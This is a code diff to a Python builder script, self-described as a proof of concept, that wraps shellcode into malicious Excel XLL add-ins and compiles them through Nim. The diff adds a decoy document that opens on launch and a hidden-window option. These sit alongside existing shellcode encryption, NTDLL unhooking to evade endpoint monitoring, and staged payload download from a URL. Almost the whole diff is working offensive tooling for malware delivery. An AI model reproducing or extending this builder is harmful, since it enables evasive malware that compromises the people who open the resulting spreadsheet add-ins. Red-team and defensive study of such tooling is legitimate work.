@@ -1,8 +1,8 @@
 import argparse
 import base64
-from os import system, remove, name, urandom
+import os
 import random
-
+import shutil
 from binascii import hexlify
 
 from Crypto.Cipher import AES
@@ -15,10 +15,11 @@ banner = """
 ( \\ / ) | | |/ ___) _  ) | |/ _  |
  ) X (| |_| | |  ( (/ /| | ( ( | |
 (_/ \\_)\\__  |_|   \\____)_|_|\\_||_|
-      (____/       Nim XLL builder PoC v0.2.0               
+      (____/       Nim XLL builder PoC v0.2.1               
 """
-if name != 'nt':
+if os.name != 'nt':
 	print("| cross-compilation coming soon™")
+	exit(1)
 print(banner)
 def encode_shellcode(sc_bytes):
 	STATE_OPEN = "<"
@@ -85,16 +86,25 @@ staging.add_argument("-u", "--stageurl", type=str,
 stageless = parser.add_argument_group('stageless arguments')
 
 stageless.add_argument("-e", "--encrypt", action="store_true",
-	help="encrypt shellcode (blowfish)")
+	help="encrypt shellcode (aes128-cbc)")
 
 compilation = parser.add_argument_group('compilation arguments')
 
 compilation.add_argument("-n", "--skip-unhook", action="store_true",
 	help="do not do NTDLL unhooking")
-compilation.add_argument("-o", "--output", type=str, default="addin.xll",
-	help="path to store the resulting .XLL file (optional)")
+
+compilation.add_argument("-w", "--hidewindow", action="store_true",
+	help="hide excel window during execution # TODO")
+
+compilation.add_argument("-d", "--decoy", type=str,
+	help="path to the decoy file to open on startup (optional)")
+
 compilation.add_argument("-v", "--verbose", action="store_true",
 	help="increase output verbosity")
+
+compilation.add_argument("-o", "--output", type=str, default="addin.xll",
+	help="path to store the resulting .XLL file (optional)")
+
 
 required = parser.add_argument_group('required arguments')
 required.add_argument("-s", "--shellcode", type=str,
@@ -118,6 +128,11 @@ if not args.skip_unhook:
 else:
 	print("| NTDLL unhooking: off")
 
+if args.hidewindow:
+	cmdline_args += "--define:hidewindow "
+	print("| hide excel window: TODO")
+else:
+	print("| hide excel window: off")
 
 print("| release mode: off")
 
@@ -130,8 +145,8 @@ if args.stageurl is None:
 		with open(args.shellcode, "rb") as f:
 			scode_bytes = f.read()
 
-		key = urandom(16)
-		iv = urandom(16)
+		key = os.urandom(16)
+		iv = os.urandom(16)
 
 		ctr = Counter.new(128, initial_value=int(hexlify(iv), 16))
 		cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
@@ -154,19 +169,6 @@ if args.stageurl is None:
 		bytes_template = bytes_to_nimarr(scode_bytes, "shellcode")
 
 		xll_nim = template_str.replace('echo "%SHELLCODE_ARRAY%"', bytes_template)
-
-
-	tempname = "temp_xll_{}.nim".format(random.randint(1,50))
-
-	with open(tempname, "w") as f:
-		f.write(xll_nim)
-
-	if args.verbose:
-		print(" VERBOSE command line:", compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename=tempname))
-
-	system(compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename=tempname))
-	remove(tempname)
-	print("! should be saved to: ", args.output)
 else:
 	print("| generating staged payload")
 	cmdline_args += "--define:staged "
@@ -184,11 +186,18 @@ else:
 
 	xll_nim = template_str.replace('%STAGINGURL%', args.stageurl)
 
+if args.decoy is not None:
+	print("| decoy file:", args.decoy)
+	xll_nim = xll_nim.replace("%DECOYFILE%", os.path.split(args.decoy)[1])
+	xll_nim = xll_nim.replace("%DECOYPATH%", args.decoy)
 
-	tempname = "temp_xll_{}.nim".format(random.randint(1,50))
-	with open(tempname, "w") as f:
-		f.write(xll_nim)
-	if args.verbose:
-		print(" \\ command line:", compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename=tempname))
-	system(compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename=tempname))
-	remove(tempname)
+	cmdline_args += "--define:decoy "
+
+
+tempname = "temp_xll_{}.nim".format(random.randint(1,50))
+with open(tempname, "w") as f:
+	f.write(xll_nim)
+if args.verbose:
+	print(" \\ command line:", compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename=tempname))
+os.system(compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename=tempname))
+print("! should be saved to: ", args.output)
